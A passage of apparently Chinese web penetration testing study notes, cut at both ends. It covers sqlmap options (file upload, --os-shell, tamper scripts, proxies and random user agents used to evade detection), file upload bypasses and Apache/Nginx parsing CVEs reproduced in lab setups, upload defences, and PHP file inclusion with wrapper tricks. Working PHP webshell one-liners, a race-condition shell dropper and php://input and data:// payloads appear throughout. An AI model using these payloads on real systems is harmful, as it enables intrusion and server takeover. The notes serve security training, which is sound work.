C:\\用户\\用户名\\AppData\\Local\\sqlmap\\output\\sqli.labs\\files\\D__1.txt下，直接查看：\n\n\n然后我们尝试使用--file-write和--file-dest上传一个文件到目标服务器：\n1python sqlmap.py -u &quot;http://sqli.labs:8889/Less-1/?id=1&quot; --file-write &quot;D:\\\\1.txt&quot; --file-dest &quot;D:\\\\phpstudy_pro\\\\WWW\\\\sqli-labs\\\\1.txt&quot;\n\n\n\n最后没有[WARNING]这种局警告就算上传成功\n\n\n5.命令执行1231. --sql-shell : 执行sql命令2. --os-cmd=xx : 执行指定cmd命令3. --os-shell : 系统交互命令\n\n\n这里如果是 mysql、postgresql、microsoft sql server，优势可以直接获取权限执行任意命令\n\n需要满足的条件：\n\n网站必须是root权限\n攻击者需要知道网站的绝对路径\nGPC 为 off ,php 主动转义的功能关闭\n\n\n比如执行sql命令，直接获取users表的所有信息：\n\n\n还有可以尝试能不能执行主机cmd命令，比如执行--os-cmd=calc：\n\n\n中途会问你网站使用的是哪种开发语言，默认为ASP，我们选择PHP：\n\n\n因为执行目标指令，其实就相当于上传一个后门文件，所以需要知道当前网站的根目录，因此它会问你是否尝试披露网站的完整路径，一律回车即可：\n\n\n这里它没有成功弄出路径，然后我们这里选2手动指定一下它的根目录：\n\n\n\n这里可以看到它已经成功上传了后门到指定的根目录，回车：\n\n\n成功弹出计算器，需要注意，这里最好是把杀软关掉\n\n同理，也可以直接执行--os-shell尝试直接拿到主机权限：\n\n\n\n6.提交方式1234--data &quot;&quot; : 通过POST发送数据--cookie &quot;&quot; : cookie注入-r &quot;&quot; : 通过数据包注入* : 标记需要注入的参数位置\n\n\n除了--data，我们还可以直接抓包整个请求体，然后通过*标记需要注入的位置，来处理POST注入：\n123456789101112131415POST /Less-11/ HTTP/1.1Host: sqli.labs:8889Content-Length: 30Cache-Control: max-age=0Origin: http://sqli.labs:8889Content-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://sqli.labs:8889/Less-11/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: closeuname=1*&amp;passwd=1*&amp;submit=Submit\n\n然后将这个数据包保存到一个.txt文件中，使用-r注入：\n1python sqlmap.py -r &quot;D:\\\\1.txt&quot; --dbs\n\n7.绕过方法12--tamper=xxx.py : 使用指定的脚本--tamper=1.py,2.py... : 批量使用脚本\n\n\n有些网站传递的参数可能是经过编码或者加密过的，而Sqlmap的payload是没有编码或者加密的，那这时我们再通过刚刚的注入是无法注入的\n\n这时候我们就需要使用一些脚本工具对Sqlmap的payload进行一些处理\n\n在sqlmap/tamper/目录下有一些常用的py脚本处理payload，比如进行Base64编码、二进制编码、转为小写等等\n\n这里以Sqli-labs第一关为例，我们对源代码进行一些处理，修改为如下代码：\n12$id=$_GET[&#x27;id&#x27;];$id=base64_decode($id);\n\n现在需要输入id为base64编码后的结果才能正常解析：\n\n此时我们使用Sqlmap正常注入肯定是不行的，可以自己下去尝试；我们这里指定脚本为自带的base64encode.py：\n1python sqlmap.py -u &quot;http://sqli.labs:8889/Less-1/?id=MQ==&quot; --tamper=base64encode --dbs\n\n成功绕过注入\n\n现在，我们再修改一下源代码，将base64_decode去掉，添加过滤机制：\n12345678910111213$id=$_GET[&#x27;id&#x27;];$id = str_replace(&quot;select&quot;, &quot;&quot;, $id);$id = str_replace(&quot;SELECT&quot;, &quot;&quot;, $id);$id = str_replace(&quot;sleep&quot;, &quot;&quot;, $id);$id = str_replace(&quot;SLEEP&quot;, &quot;&quot;, $id);$id = str_replace(&quot;elt&quot;, &quot;&quot;, $id);$id = str_replace(&quot;ELT&quot;, &quot;&quot;, $id);$id = str_replace(&quot;and&quot;, &quot;&quot;, $id);$id = str_replace(&quot;AND&quot;, &quot;&quot;, $id);$id = str_replace(&quot;or&quot;, &quot;&quot;, $id);$id = str_replace(&quot;OR&quot;, &quot;&quot;, $id);$id = str_replace(&quot;xor&quot;, &quot;&quot;, $id);$id = str_replace(&quot;XOR&quot;, &quot;&quot;, $id);\n\n这里我们将敏感关键字大小写全部替换为空字符，然后清除刚才的缓存，再使用Sqlmap跑一遍：\n\n发现是跑不出来东西的，假设我们手工注入已经知道了他的一个绕过方式，可以使用双写或者大小写绕过，这时候我们就可以自己编写Tamper脚本来处理payload\n\n比如这里我就采用大小写绕过，首先复制一个原本的tamper脚本文件，将注释删除：\n123456789#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    return payload\n\n然后在tamper()函数中写入我们的绕过规则，这里使用str.replace()函数替换payload中的敏感关键字：\n123456789101112131415161718192021#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):      if payload:          payload = payload.replace(&quot;select&quot;, &quot;SelEct&quot;)          payload = payload.replace(&quot;SELECT&quot;, &quot;SelEct&quot;)          payload = payload.replace(&quot;or&quot;, &quot;Or&quot;)          payload = payload.replace(&quot;OR&quot;, &quot;Or&quot;)          payload = payload.replace(&quot;and&quot;, &quot;And&quot;)          payload = payload.replace(&quot;AND&quot;, &quot;And&quot;)          payload = payload.replace(&quot;xor&quot;, &quot;XoR&quot;)          payload = payload.replace(&quot;XOR&quot;, &quot;XoR&quot;)          payload = payload.replace(&quot;elt&quot;, &quot;Elt&quot;)          payload = payload.replace(&quot;ELT&quot;, &quot;Elt&quot;)        return payload\n\n保存为bypass.py文件，然后再执行刚刚的命令：\n1python sqlmap.py -u &quot;http://sqli.labs:8889/Less-1/?id=MQ==&quot; --tamper=bypass --dbs\n\n成功爆出库名\n\n\n8.扩展分析\n调试分析\n123456781. -v [0-6] : 输出注入详细页面\t0：只显示Python的回溯，错误和关键消息。\t1：显示信息和警告消息。\t2：显示调试消息。\t3：有效载荷注入。\t4：显示HTTP请求。\t5：显示HTTP响应头。\t6：显示HTTP响应页面的内容\n\n当我们需要进行调试分析的时候，可以使用-v参数让Sqlmap输出详细的注入内容，方便我们查看其注入时使用的payload、请求头信息等等\n\n便于我们进行调试，等级分为0-6级，一般取4-5即可\n\n\n9.代理注入1--proxy &quot;&quot;: 使用指定的代理进行注入测试\n\n\n这个代理有两个用途，一个是指定代理为本地某个端口，然后使用BP进行抓包，分析Sqlmap的注入数据包\n1python sqlmap.py -u &quot;xxx&quot; --proxy &quot;http://127.0.0.1:8080&quot; --dbs\n\n第二个用途是使用指定的代理池去进行注入，一是为了隐匿自己的真实IP，二是当网站限制了同一IP请求次数时，可以不受影响\n1python sqlmap.py -u &quot;xxx&quot; --proxy &quot;代理池接口&quot; --dbs\n\n代理池的配置文章：https://blog.csdn.net/qq_45533926/article/details/103991470\n\n\n10.指纹伪造1231. --user-agent &quot;&quot; : 自定义UA头2. --random-agent : 随机UA头3. --time-sec=n : 延迟响应，默认为5\n\n\n通常，修改UA头是为了应对两种情况，一种是上面说到的防止Sqlmap默认的UA头无法访问某些网站，那我们就要自定义UA头\n1python sqlmap.py -u &quot;xxx&quot; --user-agent &quot;xxx&quot;\n\n第二种是Sqlmap的UA头一般为自己的信息和版本号，所以这也是它的一个强特征，在蓝队防守的时候可以通过看UA头判断是否为工具攻击，为了避免这种情况，我们就需要采用随机UA头\n1python sqlmap.py -u &quot;xxx&quot; --random-agent\n\n最后，如果网站限制了请求的速度，那么我们可以通过--time-sec=n进行延迟响应\n1python sqlmap.py -u &quot;xxx&quot; --time-sec=5\n\n11.深度测试12345678910111. --level=[1-5] : 指定Sqlmap执行测试的水平等级，默认为1\t1：默认等级，会测试GET和POST请求中的参数\t2：增加检测Cookie中的数据\t3：增加检测User-Agent和Referer中的数据\t4~5：增加尝试各种payload和边界条件，确保不放过任何潜在的注入点2. --risk=[1-3] : 执行Sqlmap执行测试的风险等级，默认为1\t1：默认等级，风险几乎为零\t2：增加时间盲注\t3：增加OR类型的布尔盲注，可能导致数据库记录被更改，谨慎使用\n\n\n用处：\nlevel：解决“测哪里”的问题，用于扩大攻击面（广度）\nrisk：解决“怎么测”的问题，用于增强攻击力（深度）\n\n\nlevel等级越高，Sqlmap就会自己去尝试注入其他的注入点，比如UA头、Cookie等等，这样做会显著提高请求的数据量，容易被拦截\nrisk等级越高，Sqlmap就会尝试一些非常规、复杂，甚至破坏性的注入语句，比如使用INSERT、DROP、UPDATE注入语句，这样做可能造成数据库被破坏，容易进局子\n\n文件上传一、常规文件上传测试1.前端验证\n如何判断前端验证？\n看页面的响应速度：前端验证快、后端验证慢\nF12查看前端代码：检查是否有校验的JS代码\n抓包：前端校验无法抓包、后端校验可以抓包\n\n\n绕过前端验证的三种方式\n禁用JS代码：通过插件ModHeader禁止页面加载JS代码\n抓包更改后缀：将php文件后缀改为允许上传的文件后缀，通过BP更改为php后缀\n本地搭建环境：根据其前端代码本地搭建环境，删去JS校验代码\n\n\n\n2. htaccess配置文件\n配置文件（.htaccess）可以更改服务器对文件的解析规则，如果服务器为Apache且允许我们上传.htaccess文件，那么我们可以利用这一点造成文件上传漏洞\n\n123&lt;IfModule mime_module&gt;\tAddHandler application/x-httpd-php .jpg&lt;/IfModule&gt;\n\n\n上述代码会将上传的.jpg后缀文件解析成php文件\n\n3.MIME绕过\n媒体类型（MIME），它用来表示文档、文件或字节流的性质个格式，它的通用结构为type/subtype，对大小写不敏感，但传统都是小写。当其后端对此校验时，我们需要更改MIME进行绕过。\n\n检测机制，例如：\n123if (!in_array($_FILES[&#x27;file&#x27;][&#x27;type&#x27;], [&quot;image/jpeg&quot;, &quot;image/png&quot;, &quot;image/gif&quot;, &quot;image/jpg&quot;])) &#123;    echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;&#125;\n\n绕过方式：\n\n可以先上传一个正确后缀名的文件，然后抓包，这是他的mime就是能通过检测机制的了，所以我们直接将名字改为php后缀即可\n\n\n\n4.文件头绕过\n判断一个文件类型的方式：后缀名、解析方式、MIME类型。但是这些东西说改就改，非常不靠谱，最靠谱的方式就是检测文件内容。 但是文件内容太长了怎么检测呢？人们规定一个文件开头的几个字节信息作为文件类型信息，检测文件类型时只需要检测前几个字节即可。\n\n常见文件头标志如下：\n123456789101112131415JPEG（jpg）：FFD8FFPNG（png）：89504E47GIF（gif）：47494638HTML（html）：68746D6C3EZIP（zip）：504B0304RAR（rar）：52617221Adobe Acrobat（pdf）：255044462D312EMS Word/Excel（xls、doc）：D0CF11E0\n\n上面的这些都是16进制的文件头标志，我们直接将这个加到文件前面更改类型是行不通的\n\n我们可以使用工具去修改文件头，我选择的是010Editor\n\n\n然后这里就可以随便改文件头了，比如我们在前面添加PNG的文件头，这里不能直接复制字节然后粘贴\n\n首先将光标移到第一位，然后选择编辑，选择插入&#x2F;覆盖，选中插入字节，然后选择从哪里开始插入，插入多少位，这里每8字节代表一位，所以插入4位即可：\n\n\n\n然后点击插入，再将上面的PNG头复制粘贴进来即可：\n\n过滤机制，例如：\n12345if (!in_array($_FILES[&#x27;file&#x27;][&#x27;type&#x27;], [&quot;image/jpeg&quot;, &quot;image/jpg&quot;, &quot;image/png&quot;, &quot;image/gif&quot;])) &#123;      echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;  &#125; else if (!in_array(bin2hex($bin), [&quot;89504E47&quot;, &quot;FFD8FFE0&quot;, &quot;47494638&quot;])) &#123;      echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;  &#125;\n\n这个方式最常用的还是使用GIF绕过，因为它的文件头比较好写，不用使用工具改，直接将GIF89a字符串添加到文件开头即可\n12GIF89a&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;\n\n5.黑名单绕过\n黑名单顾名思义就是禁止不合规的后缀名进行上传，但是这种方法并不安全，我们可以通过很多方式进行绕过，比如不在黑名单上的后缀名但可以解析成php的，也可以尝试双写、大小写、配置文件等\n\n我们可以使用 fuzzdb 这个字典（ https://github.com/fuzzdb-project/fuzzdb ），然后通过bp抓包进行爆破，看返回长度，有没有能绕过的后缀\n\n如果黑名单过滤文件后缀，不是不让上传，而是替换为空，例如：\n12345$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);  $name = str_ireplace($blacklist, &quot;&quot;, $name);  if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH . $name)) &#123;      $is_upload = true;  &#125;\n\n那么我们就可以进行双写绕过：pphphp\n\n\n6.条件竞争\n之所以会出现这个绕过方法，是因为编写代码中存在逻辑缺陷，他是先进行上传然后在进行比较最后删除，只不过代码运行的速度非常快，不容易看出来，这种缺陷黑盒是测不出来的，我们只能手动试一下这个方法，前面几种可能现在都用不到了，这个或许还能用到\n\n过滤机制，例如：\n123456789101112131415161718192021if (!empty($_POST[&#x27;submit&#x27;])) &#123;      $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);      $ext = pathinfo($name)[&#x27;extension&#x27;];      $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $name;      $whitelist = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;,&#x27;jpeg&#x27;);  \t// 先执行move_uploaded_file()函数上传文件    if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_PATH . $name)) &#123;  \t    // 再判断后缀是否违规        if(in_array($ext,$whitelist))&#123;              $rename_file = rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$ext;              $img_path = UPLOAD_PATH . &#x27;/&#x27;. $rename_file;              rename($upload_file, $img_path);              $is_upload = true;          &#125;else&#123;  \t        // 如果后缀违规，删除上传文件            echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;              unlink($upload_file);          &#125;      &#125;  &#125;\n\n绕过步骤：我们手中现在有一个1.php文件，它的作用就是被访问时，就会创建一个后门\n1&lt;?php fputs(fopen(&#x27;xiao.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;);?&gt;\n\n首先我们要确定的就是上传文件的路径，然后不断地往服务器上传这个php文件，这里需要使用BP的Intruder模块，按照如下设置让他一直上传，这里推荐先进行访问那个上传文件的路径，然后在进行重复上传，设置如下（两个是同样的设置，就让他一直上传访问就行）\n\n\n然后我们在访问 xiao.php那个路径，不断地刷新，等待奇迹即可\n\n\n7.系统特性绕过\n系统特性的绕过，比如Windows对文件大小写不敏感，而Linux对文件大小写敏感，所以导致服务器搭载到Windows上可能被大小写绕过\n\n8.00截断\n当PHP版本小于5.3.4，并且magic_quotes_gpc &#x3D; off时，该漏洞生效\n\n00截断产生的原因是因为PHP内核是由C语言实现的，所以使用了C语言中的部分字符串处理函数。比如在连接字符串时，0字节（\\x00）会作为字符串结束，导致后面的字符串在实际解析时失效。\n\n这里用靶场演示一下。过滤机制采用的是白名单过滤后缀名，只允许上传图片类型的文件\n123456789101112131415$name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);  $info = pathinfo($name);  $ext = $info[&#x27;extension&#x27;];  $whitelist = array(&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;gif&quot;);  if (in_array($ext, $whitelist)) &#123;        $filename = rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;      $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . $filename;            if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;  \t    $is_upload = true;  \t&#125; else &#123;  \t    echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;  \t&#125;&#125;\n\n可以看到这里文件上传的路径$des为传入的road下面的$filename\n\n也就是说这个road参数是我们可控的，并且这里的$filename是一个随即名字拼接在这里，然后将原本的文件相当于重命名了\n\n那这里我们就可以尝试00截断，将php文件重命名为1.jpg，然后在road参数那里重命名为1.php%00将后面的内容截断，最后上传的文件名就是1.php了\n12345678910111213# GET参数00截断// 原本逻辑?road=xxx/1.php  --&gt;  $des=xxx/1.php/xxx.jpg// 截断逻辑?road=xxx/1.php%00  --&gt;  $des=xxx/1.php%00/xxx.jpg  --&gt;  $des=xxx/1.php# 文件名00截断// 原本逻辑name=1.php  --&gt;  拦截// 00截断name=1.php\\x00.jpg  --&gt;  $ext=jpg, $name=1.php  --&gt;  $filename=xxx.jpg\n\n这里因为一个重命名操作，所以没办法使用文件名截断，那我们就只能在road参数中截断：\n\n\nPOST 00截断\n\n使用POST将road参数传入拼接，思路和上一关一样，但是要注意，我们使用的00截断是%00解码后的结果：\n12345678// GET传参http://xxx/upload/1.php%00.jpg这里使用的%00它会自动解码一次// POST传参http://xxxupload/1.php%00.jpg这里使用的%00需要我们手动进行一次解码才能够正确截断！\n\n所以我们这里直接添加%00它是不行的，需要手动URL解码一次\n\n\n解码之后这里就像消失了一样，但实际上并没有，发包访问，成功解析\n\n\n9.二次渲染\n有些网站在我们上传图片后，会对图片进行处理，二次渲染到前端页面，这个过程会导致上传的图片与原先的图片上的信息不一致，因此图片马可能会失效，我们可以将木马写到网站不会处理的地方，绕过处理实现文件上传漏洞\n\n比如，我上传一个正常的文件，它渲染到前端之后我们将其下载下来比较前后的文件大小：\n\n\n可以看到啊两个文件的大小差距非常大，说明服务器对文件做了压缩删减了，这时我们拿出010Editor进行分析：\n\n\n选择右上角的比较文件，然后选择两个文件，点击比较：\n\n\n就可以看到两个文件的差异了：\n\n\n我们选择比较他们相同的部分，看看哪里没有被服务器删除：\n\n\n现在标蓝色的位置就是他们的匹配项，也就是没有改变的地方，那我们可以选择将一句话木马写到这些位置：\n\n\n因为这个靶场有文件包含漏洞，我们利用这个，访问我们上传的图片马，并在post上连接我们的密码进行系统命令\n\n成功执行！\n\n\n10.函数缺陷绕过\n在PHP 5.3.4以下的版本（不确定），move_uploaded_file($temp_file, $img_path)函数存在解析漏洞。 如果网站使用了该函数，并且允许用户对上传文件进行重命名，那么可以通过该漏洞尝试绕过黑名单后缀名检测，造成文件上传漏洞。\n\n这里我们给出源码提示，然后我们可以控制上传文件名，但这里php版本不适合用00截断\n\n所以我们可以利用move_uploaded_file()的函数缺陷，如果上传的文件名最后存在/.，那么就它实际命名时就会当成/前面的部分，从而绕过黑名单检测：\n\n\n成功解析！\n\n\n二、漏洞复现（中间件&amp;第三方组件）1.Apache HTTPD 换行解析漏洞（CVE-2017-15715）\nApache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。\n\n漏洞影响版本：2.4.0~&#96;2.4.29&#96;\n\n漏洞描述：在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略\n\n漏洞利用条件：\n\nApache版本符合\n存在文件上传点\n能够自定义服务器保存文件名\n\n\n可以看到这个利用条件也是非常苛刻，所以只当了解原理即可，实战很难遇到\n\n漏洞复现：docker启动vulhub环境，漏洞地址：/vulhub/httpd/CVE-2017-15715\n\n\n通过指纹识别到服务器为Apache 2.4.10，符合漏洞版本：\n\n\n然后上传一个1.php文件，抓包转到Repeater模块：\n\n\n正常上传php文件是无法上传的，提示bad file：\n\n\n然后我们在上传重命名的文件名evil.php处加一个空格，方便我们之后十六进制更改\n\n转到十六进制，将刚刚添加的空格处（0x20）改为0x0A：\n\n\n然后上传，可以看到没有错误提示，说明上传成功：\n\n\n之后访问/evil.php%0a即可访问到我们上传的php：\n\n成功解析\n\n\n2.Nginx文件名逻辑漏洞（CVE-2013-4547）\nNginx是一个Web服务器，可用作反向代理、负载均衡器、邮件代理和HTTP缓存。\n\n漏洞影响版本：Nginx 0.8.41``1.4.3&#x2F;1.5.0``1.5.7\n\n漏洞描述：这个漏洞主要是请求URL的解析不正确，导致用户请求的文件名检索不正确，从而导致权限绕过和代码执行。当Nginx匹配到.php结尾的请求时，才会发送给fastcgi进行解析，但是当我们请求1.gif[0x20][0x00].php时，这个URL可以匹配上正则.php$，也能够解析为php文件。因此我们只需要上传一个空格结尾的文件，即可使其解析为PHP文件\n\n漏洞复现：启动vulhub靶场，地址为：/vulhub/nginx/CVE-2013-4547：\n\n\n然后我们将php文件改成gif上传，抓包转到Repeater模块：\n\n\n然后将文件名1.gif后面加两个空格（0x20）转到十六进制编辑，找到我们添加的空格处，将第二个0x20改为0x00：\n\n\n然后发包：\n\n\n成功上传，复制上传路径，然后访问再次抓包：\n\n\n转到Repeater模块，重复刚才的操作在1.gif后面添加两个空格以及.php，然后转到十六进制将第二个空格改为0x00，然后发包：\n\n\n成功解析成php文件\n\n\n3.Nginx 解析漏洞\n漏洞影响版本：全版本\n\n漏洞描述：该漏洞与Nginx、PHP版本无关，属于用户配置不当造成的解析漏洞。该漏洞存在的原因是Nginx在配置中对文件扩展名的处理方式。当请求一个具有多个扩展名的文件（如file.jpg.php）时，Nginx可能会根据最后一个扩展名来处理\n123456location ~ \\.php$ &#123;    fastcgi_pass   127.0.0.1:9000;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;    include        fastcgi_params;&#125;\n\n漏洞复现：启动vulhub靶场，地址为：/vulhub/nginx/nginx_parsing_vulnerability\n\n我们上传一个正常的gif文件，然后在最末尾添加php代码：\n\n\n发包上传，得到上传路径：\n\n\n直接访问没有问题，但是我们在后面加上一个&#x2F;.php后缀，他就会将其解析成 php 文件\n\n\n成功解析！\n\n\n4.编辑器&amp;上传相关&amp;第三方处理引用\n这一部分产生文件上传的原因就是由于程序或网站引用第三方的组件，最常见的就是编辑器，像ueditor、kindeditor、fckeditor等\n引用到外部的第三方编辑器实现文件上传，编辑器的安全即使上传安全\n但是由于现在编辑器的漏洞越来越少，而且很多都不采用编辑器组件，所以实战碰到的机会不大，主要是理解漏洞产生的思路\n参考文章：\n渗透测试-Ueditor漏洞捡漏-腾讯云开发者社区-腾讯云\n常见编辑器漏洞汇总【超全】（转载）-CSDN博客\n实战纪实 | 编辑器漏洞之Ueditor-任意文件上传漏洞 （老洞新谈）_ueditor漏洞-CSDN博客\n\n\n\n5.CMS源码&amp;上传相关&amp;已知识别到利用\n有的网站也会直接采用第三方的CMS，比如一些第三方的OA系统：泛微、通达、用友等等\n那这时候我们就是已知CMS源码架构，一般自己挖出或审出漏洞的几率是极小的\n所以遇到这类网站，我们一般就是尝试去看看是否有已知的漏洞可以利用\n\n6.通达OA任意文件上传\n这里的演示环境是通达OA-V11.2版本，这里建议是安装到刚刚的虚拟机环境中\n\n安装完之后就直接配置\n\n\n等它安装完之后就可以直接访问了\n\n\n对于这类公开的CMS，我们可以信息收集到它的版本这些，然后到网上搜一下是否有对应的漏洞\n\n或者直接利用专门的漏洞扫描工具直接开扫即可，比如这里One-Fox上就有Liqun工具可以扫描：\n\n\n这里扫到了存在文件上传漏洞，然后也成功上传了shell，直接连就好了\n\n\n三、安全上传1.目录权限\n在文件属性安全那里将读写权限取消，那么不管他传什么样的后门，都执行不了，访问403\n这种情况有小概率能绕过，需要将文件上传到有读写权限的地方\n\n2.字节流传输数据\n如果网站选用字节流传输的方式，那么不管我们传什么类型的文件，他只接受文件数据，然后按照后端定义好的安全协议进行解析，假如它定义的只接受图片，那么即使我们上传php也会强制解析成图片（解析后的是破损的，什么用都没有），只有上传图片才会正确解析\n\n最常见的例子就是在图片上传点，我将图片转为字节流，然后采用Base64编码传输到后端，后端添加协data:image/png;base64\n1231. 上传图片 --&gt; 图片数据 --&gt; Base64值2. 显示图片 --&gt; Base64值 --&gt; 解码解析还原3. 固定协议解析上传文件 --&gt; 即使有上传漏洞也无法利用\n\n后端处理的关键代码：\n1$base64Data = base64_encode(file_get_contents($tmpFilePath));\n\n上传一个图片：\n\n\n它上传的格式是下面所示的Base64编码值，然后解码之后正常显示\n\n而上传php文件之后是这个样子\n\n\n可以看到，即使上传成功，也解析不了\n\n\n3.分站存储\n文件和源码存储到不同的服务器，该服务器仅用于存储文件，所以即使我们成功上传后门，得到的也不是目标网站权限，而且一般这种分站存储都是配合目录权限操作的，我们的木马大概率链存储文件的地方都连不上去\n\n将上传的文件和网站源码分开放，但仍处于同一服务器，结构如下：\n123456789101112服务器A├── root/                 │   ├── www/              # 网站源码目录│   │   ├── static/          │   │   ├── app/│   │   │   └──index.php│   │   └── templates/服务器B├── upload/               # 文件上传目录│   ├── 1.php│   └── 1.jpg\n\n4.OSS 云存储\n利用云厂商的 OSS 技术，将文件存储到Bucket桶中，OSS对象存储的文件只做存储，不做处理，访问的时候它要么下载，要么查看，压根不会执行，即使它执行了，你也是在和云厂商对抗，而不是目标网站，所以上传shell基本没有啥用了\n\n5.总结\n遇到这四个尽快跑路，基本上传失败或者连不上去，也就第一个能有小概率绕过，但概率很小\n\n文件包含一、基础知识\n原理：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为文件包含。\n\n在文件包含的过程中，如果文件能进行控制，则存在文件包含漏洞\n\n在PHP中，关于文件包含的函数有：\n1234include()include_once()require()require_once()\n\n如果上述传入的这些函数的参数可控，那么就有可能存在文件包含漏洞\n\n文件包含漏洞分为两大类：\n\n本地包含：Local File Include（LFI），即只能包含本地拥有的文件\n远程包含：Remote File Include（RFI），即可以加载远程文件进行包含\n\n\n差异原因：代码过滤或者环境配置文件开关决定\n\n\n二、远程文件包含\n远程文件包含必须满足的条件：\n\n存在包含点\n没有代码过滤\n允许远程加载并执行远程文件\n\n\n那么对于PHP而言，需要配置选项allow_url_include和allow_url_fopen为ON状态，在小皮中，就要将远程文件和远程包含开启：\n\n\n不过这个默认是关闭的，实战中很少碰到\n\n\n三、本地文件包含\n比起RFI，LFI的利用条件就简单了很多，只需要有包含点即可\n本地文件包含分为两大类：\n有文件包含：配合文件上传，实现包含自定义文件\n无文件利用：\n包含日志文件利用\n包含Session文件利用\n伪协议利用\n\n\n\n\n\n四、伪协议1.基础知识\n\n主要协议有file://、php://filter、php://input、zip://、data://等等\n\n参考文章：PHP伪协议总结 - 个人文章 - SegmentFault 思否\n\n文件读取：\n12345# 读取/etc/password文件，使用绝对路径！file:///etc/password# 读取phpinfo.php文件，并进行base64编码，使用相对路径！php://filter/read=convert.base64-encode/resource=phpinfo.php\n\n文件写入：\n12345# 写入phpinfo.php文件，并进行base64编码 =&gt; 需要配合file_put_contents()函数使用php://filter/write=convert.base64-encode/resource=phpinfo.php# POST提交代码创建shell.php文件php://input POST:&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]);?&gt;&#x27;); ?&gt;\n\n代码执行：\n12345678# POST提交php代码php://input POST:&lt;?php phpinfo();?&gt;# 执行php代码data://text/plain,&lt;?php phpinfo();?&gt;# 执行base64编码后的php代码data://text/plain;base64,PD9waHAgcGwaW5mbygpOz8%2b\n\n2.黑盒利用-vulnweb-有无文件包含\n黑盒发现主要通过观察参数传递的数据和文件名是否对应\n\n我们有这样一个网站： http://testphp.vulnweb.com/showimage.php\n\n现在它可以传入一个参数file去包含一个文件，现在我们就是一个黑盒，我们就可以尝试传入?file=showimage.php看看能否包含当前文件：\n\n\n能够成功返回showimage.php的源码，一般来说网站的首页文件都是index.php，那我们尝试包含一下：\n\n\n成功返回信息，同时，这里也暴露出了数据库配置文件的文件名，直接包含一下：\n\n\n成功得到数据库的账号和密码，接管数据库\n\n那这个靶场到这里就结束了，后续利用实战中可以尝试连数据库，或者利用伪协议上传马子都是OK的\n\n\n3.白盒利用-ctfshow-伪协议玩法\n白盒发现：\n可通过应用功能追踪代码定位审计\n可通过脚本特定函数搜索定位审计\n可通过伪协议玩法绕过相关修复等\n\n\nPHP：include、include_once、require、require_once\ninclude在包含的过程中如果出现错误，会抛出一个警告，但程序继续执行\nrequire函数出现错误时，会直接报错并退出和终止程序\n\n\nJava：java.io.File、java.io.FileReader等\nASP.NET：System.IO.FileStream、System.IO.StreamReader等\n\n五、CTFshow演示1.CTFshow-78 http伪协议\n这里就是直接把源代码给出来，然后让你分析绕过的：\n123456if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      include($file);  &#125;else&#123;      highlight_file(__FILE__);  &#125;\n\n那这里什么都没过滤，就想用什么用什么了，可以远程包含尝试一下，也可以本地包含利用伪协议执行php命令\n\n我们这里就本地包含解题吧，一般读取文件都使用php://filter的这个协议，因为我们一开始并不知道当前目录的绝对路径\n\n所以这里可以先执行一个命令看看当前文件夹有哪些文件：php://input POST:&lt;?php system(&#39;ls&#39;);?&gt;：\n\n\n然后看到了flag.php，那我们就直接尝试读取就好了：\n\n\n当然，这里也可以用php://filter/read=convert.base64-encode/resource=flag.php读取，然后base64解码即可：\n\n\n\n\n2.CTFshow-79 data伪协议\n源码：\n1234567if(isset($_GET[&#x27;file&#x27;]))&#123;      $file = $_GET[&#x27;file&#x27;];      $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);      include($file);  &#125;else&#123;      highlight_file(__FILE__);  